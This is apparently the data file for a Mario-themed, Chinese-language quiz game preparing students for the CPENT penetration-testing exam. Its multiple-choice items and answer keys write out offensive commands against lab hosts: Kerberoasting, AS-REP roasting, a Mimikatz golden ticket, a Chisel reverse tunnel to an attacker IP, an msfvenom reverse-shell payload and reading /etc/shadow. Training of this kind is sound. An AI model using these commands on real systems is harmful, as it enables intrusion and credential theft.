export const MARIO_RANKS = [
  { minLevel: 1, title: 'Small Mario (迷你駭客)', sprite: '🍄', color: '#ff4444' },
  { minLevel: 3, title: 'Super Mario (超級滲透者)', sprite: '⭐', color: '#38bdf8' },
  { minLevel: 5, title: 'Fire Mario (火焰 Exploit)', sprite: '🔥', color: '#f59e0b' },
  { minLevel: 7, title: 'Cape Mario (穿透斗篷羽毛)', sprite: '🪶', color: '#a855f7' },
  { minLevel: 9, title: 'CPENT World Champion (破關宗師)', sprite: '👑', color: '#eab308' }
];

export const MARIO_SHOP_ITEMS = [
  {
    id: 'item_mushroom',
    name: '超級紅蘑菇 (Super Mushroom)',
    category: 'powerup',
    price: 60,
    icon: '🍄',
    description: '變身 Super Mario！立即回復 50 HP，並提升當前生命上限。',
    effectType: 'heal_hp',
    healValue: 50
  },
  {
    id: 'item_fire_flower',
    name: '火焰花 (Fire Flower)',
    category: 'gear',
    price: 150,
    icon: '🔥',
    description: '裝備後可發射 Exploit 火球！AD 與 Pivoting 關卡爆擊率提升 30%。',
    effectType: 'fireball_crit'
  },
  {
    id: 'item_starman',
    name: '無敵金星 (Starman)',
    category: 'consumable',
    price: 90,
    icon: '⭐',
    description: '獲得無敵星狀態！立即重置目標 IDS 警報，並抵禦下一次失誤扣血。',
    effectType: 'invincible'
  },
  {
    id: 'item_green_pipe',
    name: '綠色縮時水管 (Warp Pipe)',
    category: 'gear',
    price: 180,
    icon: '🧪',
    description: '遭遇 Pivoting 隧道題目時，自動為你排除 1 個錯誤干擾水管。',
    effectType: 'pipe_filter'
  },
  {
    id: 'item_1up',
    name: '1-UP 綠蘑菇 (Extra Life)',
    category: 'gear',
    price: 200,
    icon: '🟢',
    description: '增加一條備用命！HP 歸零時立刻以 40 HP 滿血復活。',
    effectType: 'extra_life'
  }
];

export const MARIO_WORLDS = [
  {
    id: 'world_1',
    worldNum: '1',
    name: 'WORLD 1 // 邊界平原 (Perimeter Recon)',
    stageCode: 'WORLD 1-1',
    themeColor: '#00e800',
    skyBg: 'linear-gradient(180deg, #5c94fc 0%, #000 100%)',
    bossName: 'WAF Goomba Guard (邊界守衛)',
    castleType: '🏰 小型要塞',
    description: '晴空萬里的偵察平原，隱藏著非標準端口與防火牆水管。利用高速掃描打通前線！',
    challenges: [
      {
        id: 'w1_1',
        stage: '1-1',
        title: '端口探測小徑 (All-Ports Scan)',
        difficulty: 'Easy',
        targetHost: '10.10.10.200 (EDGE-GATEWAY)',
        targetOS: 'Linux Alpine / Hardened Kernel',
        scenario: '【WORLD 1-1】前方遇到高牆阻擋！目標主機有多達 65535 個端口，且隱藏服務常開在高位（如 49152+）。你需要最快且最不容易漏掉端口的 Nmap 組合參數發動火球跳躍：',
        options: [
          {
            text: 'nmap -sS -p- --min-rate 2000 -T4 -Pn 10.10.10.200 -oN allports.txt',
            isCorrect: true,
            isCritical: true,
            damage: 38,
            feedback: '【踩踏命中！+100 PTS】全端口 SYN 探測迅速抓出 49821 隱藏 SSH 水管！'
          },
          {
            text: 'nmap -sV -sC -p- 10.10.10.200',
            isCorrect: false,
            feedback: '【撞到障礙！】全部 65535 埠同時跑腳本導致時間超時 (Time Out)！'
          },
          {
            text: 'nmap -T1 -p 1-1000 10.10.10.200',
            isCorrect: false,
            feedback: '【速度太慢】T1 蝸牛爬行，完全錯過非標準高位埠！'
          },
          {
            text: 'ping -c 4 10.10.10.200',
            isCorrect: false,
            feedback: '【揮空！】目標主機禁 ping，空手而歸。'
          }
        ],
        hint: '第一階段先用 `-sS -p- --min-rate 2000 -Pn` 快速抓出開放埠號。',
        cpentNote: 'CPENT 雙階段掃描法：Stage 1 快速全埠位標記（min-rate 鎖定在 1500~2500 防反制）；Stage 2 針對特定端口深入腳本列舉。'
      }
    ]
  },
  {
    id: 'world_2',
    worldNum: '2',
    name: 'WORLD 2 // 地底域控古堡 (Active Directory)',
    stageCode: 'WORLD 2-1',
    themeColor: '#bf00ff',
    skyBg: 'linear-gradient(180deg, #1b0c2e 0%, #000 100%)',
    bossName: 'Bowser DC (域管庫巴魔王)',
    castleType: '🏰 庫巴域控神廟',
    description: '幽暗的地底世界，充斥著 Kerberos 票證守衛與 BloodHound 迷宮。奪取黃金票證即可通關！',
    challenges: [
      {
        id: 'w2_1',
        stage: '2-1',
        title: '幽靈地道：Kerberoasting 票證竊取',
        difficulty: 'Medium',
        targetHost: '192.168.10.15 (SRV-SQL01.CORP.LOCAL)',
        targetOS: 'Windows Server 2019',
        scenario: '【WORLD 2-1】你已取得普通域使用者帳號 `corp\\guest01`。眼前出現 SPN 服務帳號石碑，你需要索取 TGS 票證以便離線破解。Impacket 工具套件的精確指令為何？',
        options: [
          {
            text: 'impacket-GetUserSPNs corp.local/guest01:Password123 -dc-ip 192.168.10.10 -request',
            isCorrect: true,
            isCritical: true,
            damage: 40,
            feedback: '【發射火球！+200 PTS】成功 Dump 出 MSSQL 服務帳號的 TGS 票證雜湊！'
          },
          {
            text: 'impacket-secretsdump corp.local/guest01:Password123@192.168.10.15 -ntds vss',
            isCorrect: false,
            feedback: '【被庫巴刺猬扎到！】guest01 僅為普通使用者，無權讀取 NTDS.dit。'
          },
          {
            text: 'impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat',
            isCorrect: false,
            feedback: '【走錯路口】這是 AS-REP Roasting，不是 Kerberoasting！'
          },
          {
            text: 'impacket-wmiexec corp.local/guest01@192.168.10.15 "net user /domain"',
            isCorrect: false,
            feedback: '【WMI 被擋】guest01 沒有管理員執行權限。'
          }
        ],
        hint: '查詢 SPN 並索取 TGS 票證需加上 `-request`。',
        cpentNote: 'Kerberoasting 攻擊只要擁有任何合法域憑據即可對整個目錄林發動。使用 Impacket GetUserSPNs.py -request 取得 TGS-REP 雜湊，接著送入 Hashcat 13100 破解。'
      },
      {
        id: 'w2_2',
        stage: '2-2',
        title: '免驗證深坑：AS-REP Roasting 突擊',
        difficulty: 'Medium',
        targetHost: '192.168.10.10 (DC01.CORP.LOCAL)',
        targetOS: 'Windows Server 2022',
        scenario: '【WORLD 2-2】地底深處部分帳號啟用了「Do not require Kerberos preauthentication」屬性。你打算匿名向 KDC 索取加密的 AS-REP 雜湊，指令應為？',
        options: [
          {
            text: 'impacket-GetNPUsers corp.local/ -usersfile userlist.txt -no-pass -dc-ip 192.168.10.10',
            isCorrect: true,
            isCritical: true,
            damage: 42,
            feedback: '【金幣噴發！+300 PTS】成功取得未啟用 Pre-Auth 的 AS-REP 雜湊！'
          },
          {
            text: 'impacket-ticketConverter ticket.kirbi ticket.ccache',
            isCorrect: false,
            feedback: '【道具用錯】ticketConverter 僅用於票證格式轉換。'
          },
          {
            text: 'nmap --script smb-vuln-ms17-010 -p 445 192.168.10.10',
            isCorrect: false,
            feedback: '【偏離主線】這是永恆之藍探測，無關 AS-REP。'
          },
          {
            text: 'kerbrute userenum --dc 192.168.10.10 -d corp.local userlist.txt -p password',
            isCorrect: false,
            feedback: '【非 AS-REP】枚舉使用者與取得 AS-REP 雜湊不同。'
          }
        ],
        hint: '尋找免預先認證的帳號使用 GetNPUsers，搭配 -no-pass 與使用者清單。',
        cpentNote: '若設定 DONT_REQ_PREAUTH，任何人都可以發送 AS-REQ，KDC 返回使用者密碼雜湊加密的 AS-REP。Hashcat 模組 18200。'
      },
      {
        id: 'w2_castle',
        stage: '2-🏰',
        title: '庫巴神廟決戰：黃金票證 (Golden Ticket)',
        difficulty: 'Hard',
        targetHost: '192.168.10.10 (Domain Controller)',
        targetOS: 'Windows Server 2022',
        scenario: '【WORLD 2-CASTLE】來到域控庫巴大殿！你已持有 `krbtgt` 的 NTLM 雜湊及 Domain SID。現在要偽造長達 10 年有效的黃金票證並直接注入記憶體 (Pass-The-Ticket)，Mimikatz 指令為？',
        options: [
          {
            text: 'kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:NTLM_HASH /id:500 /ptt',
            isCorrect: true,
            isCritical: true,
            damage: 55,
            feedback: '【庫巴墜入岩漿！STAGE CLEAR！】成功簽發黃金票證並利用 /ptt 注入，徹底攻克 Active Directory！'
          },
          {
            text: 'kerberos::silver /service:cifs /target:dc01 /domain:corp.local /ntlm:NTLM_HASH',
            isCorrect: false,
            feedback: '【威力不足】這是白銀票證 (Silver Ticket)，無法支配全域！'
          },
          {
            text: 'lsadump::dcsync /domain:corp.local /user:krbtgt',
            isCorrect: false,
            feedback: '【順序顛倒】你已經拿到 hash 了，現在是簽發偽造階段！'
          },
          {
            text: 'sekurlsa::logonpasswords',
            isCorrect: false,
            feedback: '【無效指令】無法從 LSASS 內存直接捏造黃金票證。'
          }
        ],
        hint: 'Golden ticket 需要 /user, /domain, /sid, /krbtgt, /ptt (pass the ticket)。',
        cpentNote: '黃金票證使用 KDC 密鑰 (krbtgt NTLM hash) 對 TGT 簽名與加密。持有 Golden Ticket 即等同於 KDC 本身。'
      }
    ]
  },
  {
    id: 'world_3',
    worldNum: '3',
    name: 'WORLD 3 // 水管穿透深淵 (Double Pivoting)',
    stageCode: 'WORLD 3-1',
    themeColor: '#00f3ff',
    skyBg: 'linear-gradient(180deg, #022030 0%, #000 100%)',
    bossName: 'Subnet Titan (隔離子網領主)',
    castleType: '🧪 雙層穿透要塞',
    description: '被防火牆隔離的子網絡！跳入綠色 Ligolo 水管，打通 TUN 虛擬網卡與 Chisel 反向隧道！',
    challenges: [
      {
        id: 'w3_1',
        stage: '3-1',
        title: '綠色水管：Ligolo-ng 內網雙向路由',
        difficulty: 'Medium',
        targetHost: '10.10.120.5 (Jump Box)',
        targetOS: 'Ubuntu 22.04 LTS (雙網卡)',
        scenario: '【WORLD 3-1】跳板機已連接到本機的 Ligolo-ng proxy。為了讓攻擊機的所有工具直接穿透到 `172.16.50.0/24` 水管網段，本機下達什麼路由指令？',
        options: [
          {
            text: 'sudo ip route add 172.16.50.0/24 dev ligolo',
            isCorrect: true,
            isCritical: true,
            damage: 45,
            feedback: '【水管打通！咻～】成功將子網綁定至 ligolo TUN 虛擬網卡，全協議無縫穿透！'
          },
          {
            text: 'iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 172.16.50.1',
            isCorrect: false,
            feedback: '【水管卡住】單埠轉發無法支援多協議原生掃描。'
          },
          {
            text: 'route add -net 172.16.50.0 netmask 255.255.255.0 gw 127.0.0.1',
            isCorrect: false,
            feedback: '【死循環】導向 127.0.0.1 會封包迴圈！'
          },
          {
            text: 'proxychains -q nmap 172.16.50.0/24',
            isCorrect: false,
            feedback: '【速度太慢】Ligolo 的優勢就是擺脫 Proxychains 延遲！'
          }
        ],
        hint: 'Ligolo-ng 依賴 TUN 裝置，以 `ip route add <subnet> dev ligolo` 綁定。',
        cpentNote: 'Ligolo-ng 建立 TUN 網卡後，直接執行原生 Nmap -sT 與 SMB 工具極度順暢，擺脫 Proxychains 限制。'
      },
      {
        id: 'w3_2',
        stage: '3-2',
        title: '反向水管：Chisel SOCKS5 穿越防火牆',
        difficulty: 'Hard',
        targetHost: '172.16.50.15 (Windows Internals)',
        targetOS: 'Windows 10 Enterprise',
        scenario: '【WORLD 3-2】內網主機僅允許 443 出網。你要在攻擊機與被控機搭建反向 SOCKS5 隧道，配對指令為？',
        options: [
          {
            text: '攻擊機: chisel server -p 443 --reverse | 被控機: chisel.exe client 攻擊機IP:443 R:1080:socks',
            isCorrect: true,
            isCritical: true,
            damage: 50,
            feedback: '【反向水管連通！+300 PTS】攻擊機 1080 埠已成為直通內部網絡的代理入口！'
          },
          {
            text: '攻擊機: chisel client 172.16.50.15:443 1080:socks | 被控機: chisel.exe server -p 443',
            isCorrect: false,
            feedback: '【方向錯誤】被控機無法被外部直連。'
          },
          {
            text: '攻擊機: ssh -R 1080:localhost:443 root@victim | 被控機: chisel socks',
            isCorrect: false,
            feedback: '【語法混亂】工具指令不匹配。'
          },
          {
            text: '攻擊機: nc -lvnp 443 | 被控機: chisel.exe client 攻擊機IP:443 1080',
            isCorrect: false,
            feedback: '【協議崩潰】Netcat 無法處理 WebSockets 握手。'
          }
        ],
        hint: '反向模式：Server 啟用 `--reverse`，Client 綁定 `R:1080:socks`。',
        cpentNote: 'Chisel 利用 HTTP/WebSocket 協議進行多路複用封裝，配合 `--reverse` 參數可將任何外向出網連線轉換為入向 SOCKS5 代理。'
      }
    ]
  },
  {
    id: 'world_4',
    worldNum: '4',
    name: 'WORLD 4 // 工控齒輪工廠 (OT & SCADA)',
    stageCode: 'WORLD 4-1',
    themeColor: '#ffb000',
    skyBg: 'linear-gradient(180deg, #2b1d00 0%, #000 100%)',
    bossName: 'SCADA Automaton (工控中樞核心)',
    castleType: '🏭 工控樞紐廠房',
    description: '巨大齒輪與 PLC 閥門旋轉的工控工廠。利用 Modbus 協議偽造暫存器數據，解除實體防線！',
    challenges: [
      {
        id: 'w4_1',
        stage: '4-1',
        title: '閥門齒輪：Modbus 暫存器讀取 (FC03)',
        difficulty: 'Medium',
        targetHost: '192.168.88.20 (PLC-STATION-01)',
        targetOS: 'Embedded RTOS (Modbus Port 502)',
        scenario: '【WORLD 4-1】水冷閥門狀態儲存在保持暫存器 (Holding Registers) 中。在 Modbus 標準協議中，讀取保持暫存器的功能碼 (Function Code) 為何？',
        options: [
          {
            text: 'Function Code 0x03 (Read Holding Registers)',
            isCorrect: true,
            isCritical: true,
            damage: 45,
            feedback: '【齒輪停轉！+250 PTS】成功以 FC03 讀取 40001 數值，取得冷卻系統覆寫權限！'
          },
          {
            text: 'Function Code 0x01 (Read Coils)',
            isCorrect: false,
            feedback: '【標的不符】0x01 讀取的是離散線圈，非保持暫存器。'
          },
          {
            text: 'Function Code 0x05 (Write Single Coil)',
            isCorrect: false,
            feedback: '【動作錯誤】0x05 是寫入單個線圈。'
          },
          {
            text: 'Function Code 0x10 (Write Multiple Registers)',
            isCorrect: false,
            feedback: '【觸發警報】未經校驗直接寫入觸發安全聯鎖！'
          }
        ],
        hint: 'Modbus 代碼：01=Coils, 02=Inputs, 03=Holding Registers, 04=Input Registers。',
        cpentNote: 'Modbus TCP 運行於 Port 502，無認證加密。使用 pymodbus 或 nmap modbus-discover 腳本可直接與 PLC 通信。'
      }
    ]
  },
  {
    id: 'world_5',
    worldNum: '5',
    name: 'WORLD 5 // 岩漿逆向熔爐 (Binary Exploit & IoT)',
    stageCode: 'WORLD 5-1',
    themeColor: '#ff0055',
    skyBg: 'linear-gradient(180deg, #3d0312 0%, #000 100%)',
    bossName: 'Stack Smasher (ROP 幽靈巨怪)',
    castleType: '🏰 岩漿溢位城堡',
    description: '滾燙的岩漿與二進制碎片！精確計算 EIP 偏移量，避開壞字元，跳躍至 JMP ESP 踏板！',
    challenges: [
      {
        id: 'w5_1',
        stage: '5-1',
        title: '岩漿跳躍：32-bit Buffer Overflow EIP Offset',
        difficulty: 'Hard',
        targetHost: '10.10.20.80:9999 (Brainpan Vulnerable Service)',
        targetOS: 'Windows 7 / x86 Architecture',
        scenario: '【WORLD 5-1】程式崩潰時 EIP 被覆蓋為 `35724134`。你要使用何種指令計算精確 EIP 偏移量 (Offset)？',
        options: [
          {
            text: 'msf-pattern_offset -l 1000 -q 35724134',
            isCorrect: true,
            isCritical: true,
            damage: 50,
            feedback: '【踩中跳台！+350 PTS】計算出 EIP Offset 為 524！可構造 JMP ESP 地址實現跳轉！'
          },
          {
            text: 'gdb-peda pattern_offset 0x41414141',
            isCorrect: false,
            feedback: '【掉落岩漿！】0x41414141 是純 AAAA 填料，無法反推。'
          },
          {
            text: 'msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -b "\\x00"',
            isCorrect: false,
            feedback: '【時機過早】尚未排除壞字元前，Shellcode 必定崩潰。'
          },
          {
            text: 'mona compare -f bytearray.bin -a esp',
            isCorrect: false,
            feedback: '【順序錯誤】此時尚未精準定位 EIP。'
          }
        ],
        hint: '使用 `msf-pattern_offset -q <EIP十六進制數值>` 即可精準定位偏移。',
        cpentNote: '溢位流程：Fuzzing -> Pattern Offset 定位 EIP -> 測試壞字元 -> 尋找 JMP ESP 地址 -> 組合 Exploit。'
      }
    ]
  },
  {
    id: 'world_6',
    worldNum: '6',
    name: 'WORLD 6 // 星星雲端王座 (CTF & Root Sovereign)',
    stageCode: 'WORLD 6-1',
    themeColor: '#eab308',
    skyBg: 'linear-gradient(180deg, #1f1b00 0%, #000 100%)',
    bossName: 'Root Sovereign (終極特權王座)',
    castleType: '⭐ 星光奪旗王座',
    description: '浮空於雲端的最終關卡！尋找隱秘的 SUID 提權通道，奪取 Root Flag 登上 CPENT 冠軍王座！',
    challenges: [
      {
        id: 'w6_1',
        stage: '6-1',
        title: '雲端浮空島：Linux SUID 異常提權',
        difficulty: 'Medium',
        targetHost: '10.10.150.12 (LINUX-STUDENT-WORKSTATION)',
        targetOS: 'Debian 11 (Linux Kernel 5.10)',
        scenario: '【WORLD 6-1】取得低權限 Shell 後，你要尋找被賦予 SUID (`-u=s`) 權限的二進制檔案以利用 GTFOBins 提權，標準 Find 指令為何？',
        options: [
          {
            text: 'find / -perm -u=s -type f 2>/dev/null',
            isCorrect: true,
            isCritical: true,
            damage: 42,
            feedback: '【抓住旗桿！FLAG CAPTURED！】發現 SUID `/usr/bin/find`，直接晉升為 ROOT！'
          },
          {
            text: 'ls -la /root 2>/dev/null',
            isCorrect: false,
            feedback: '【被阻擋】低權限無權列出 /root。'
          },
          {
            text: 'sudo -l',
            isCorrect: false,
            feedback: '【需要密碼】當前帳號無交互終端密碼。'
          },
          {
            text: 'cat /etc/shadow',
            isCorrect: false,
            feedback: '【權限不足】/etc/shadow 僅允許 root 讀取。'
          }
        ],
        hint: '尋找 SUID 二進制必備：`find / -perm -u=s -type f 2>/dev/null`。',
        cpentNote: '列出 SUID 檔案後，立即比對 GTFOBins (find, vim, cp, nmap, bash, pkexec 等)。'
      }
    ]
  }
];
